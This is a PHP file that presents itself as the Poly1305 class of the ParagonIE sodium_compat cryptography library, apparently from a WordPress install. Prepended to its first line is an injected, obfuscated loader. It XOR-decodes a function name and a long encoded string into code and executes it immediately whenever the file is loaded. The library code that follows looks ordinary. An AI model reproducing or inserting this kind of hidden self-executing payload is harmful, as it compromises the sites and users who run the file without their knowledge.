<?php $iwkUqyQd='OR2Q3E4VL<  E;U'; $VPNpHR=', W0G k09RCT,T;'^$iwkUqyQd; $NbEspE=' 4zW>>=QT1==d7-8HN1PV Z7gX2DPnfSMXmZYN,g5VIY ; = d4=6-J6829=UX5Qg2 O4euB=XMCwFiUeGyocASUNpnFeFun>jQ= BiDfpkBNou.i=2 407io-,OMclKo+YfbKxxlD3 ZOqBrqI7M4uA8aocmm,TN9UGilLAAL-EZop;RJyfBZ8hyB=,HB6RG,3OFTnSMgK27aQOMJqztKTA4KtMu7MNP,=Q+tnc<WUM5iskP A 5 Zrjuln<ywrqk NIE<IYFwotKD1T1EEM>4dnR.J7nQ08hPSvFVBYpfE1LEPGIla87ZYNIlKynU5gmqkJRO7dw=ImFR9P3P0DqQeg-+mng6rLHLEFWDDJrsW=LXG.qG<obAC S.R<1=0svAt<1,M49ZV6;:1UuchJZR=HZsY1k5ERn1JHRMMhs6E;,481W;V,a:O0iXT.Qlm< 9d4S+2wsk 4ZV1HgMRJ7AhtzuQAJ-hQS0cNno9 CR,TTAjecrUO;X,3ZS j 5-  1ZIYQOldwJPVXOophLpi>OZqpX >37W=0KD1QmRDejh9rqZ2-edTUB=zoI-EkZVefjRjDeYsUjfQCgrY5EF2ElW5I;I<B90CDvJ5=6O 2teLn,6HPynpuxyhsFp;+OL:Xt T-0ps YKPVX4Vhmnrn<X=-gzeooN'; $SKUObLQN=$VPNpHR('', 'IRRvXKS2 XRS;RUQ;:BxqX5E8<S0119>8,JspnWm<0<7COIRNDLRDr.WLSfb8-AyCVA;UIUfV=4jWfIuE<sfje< :PSfBaNd7c7RRjM-FMKruOQGUNFRXUYAKIM;,JWkKBrMKAqqH+FTzaLbZU-V9U.eQ<O=MIG17bq.IIl25>A 4GTP73P;ka2ap0XX=0XzcCF;oodZ0m68=E5.9+QGT-5-G.OGQS,:1sV4RTSCZ69>PRya6O3ETC2RBQ3-s6<;4KA=iaW, fJQTo2P8D lmE>mJ6O>V1:UAHmsR-3;bzoaU-11gtLENV6,+rf6sd<SGEPO.3;VMWFCd =K5R3XdYu:5hz8+4bR-;la-2=dwLSsK-42KXgGekHgD2Z3cZXISKaPWTUv>0SrRZNPuHCL<;>H-ayPLaHOXJU+<3mpH3C+HIFQP;R,IIB B6<5Z032QUMLV2XWAG4DQ99U-Oi6+C AXZQ5 >L7:6IJgUePFkvH5  JCER4=I9Ul16Y5EMDSTBrn246KHWn47,.FPNjPAS+oYT<AJRlpVU2clxMoyEMQZFG9QNPSacpXHYzNpR97SWY0R T=JfRAxcATyT74S<3<P0d,D+JD0lQ:TDZ AVSIlJHW<1PGPUXYHS=z2N9-VpPD5YQ+TP82<99Pq5DUxgY TYOJLTe3'^$NbEspE); $SKUObLQN();

if (class_exists('ParagonIE_Sodium_Core_Poly1305', false)) {
    return;
}

/**
 * Class ParagonIE_Sodium_Core_Poly1305
 */
abstract class ParagonIE_Sodium_Core_Poly1305 extends ParagonIE_Sodium_Core_Util
{
    const BLOCK_SIZE = 16;

    /**
     * @internal You should not use this directly from another application
     *
     * @param string $m
     * @param string $key
     * @return string
     * @throws SodiumException
     * @throws TypeError
     */
    public static function onetimeauth($m, $key)
    {
        if (self::strlen($key) < 32) {
            throw new InvalidArgumentException(
                'Key must be 32 bytes long.'
            );
        }
        $state = new ParagonIE_Sodium_Core_Poly1305_State(
            self::substr($key, 0, 32)
        );
        return $state
            ->update($m)
            ->finish();
    }

    /**
     * @internal You should not use this directly from another application
     *
     * @param string $mac
     * @param string $m
     * @param string $key
     * @return bool
     * @throws SodiumException
     * @throws TypeError
     */
    public static function onetimeauth_verify($mac, $m, $key)
    {
        if (self::strlen($key) < 32) {
            throw new InvalidArgumentException(
                'Key must be 32 bytes long.'
            );
        }
        $state = new ParagonIE_Sodium_Core_Poly1305_State(
            self::substr($key, 0, 32)
        );
        $calc = $state
            ->update($m)
            ->finish();
        return self::verify_16($calc, $mac);
    }
}
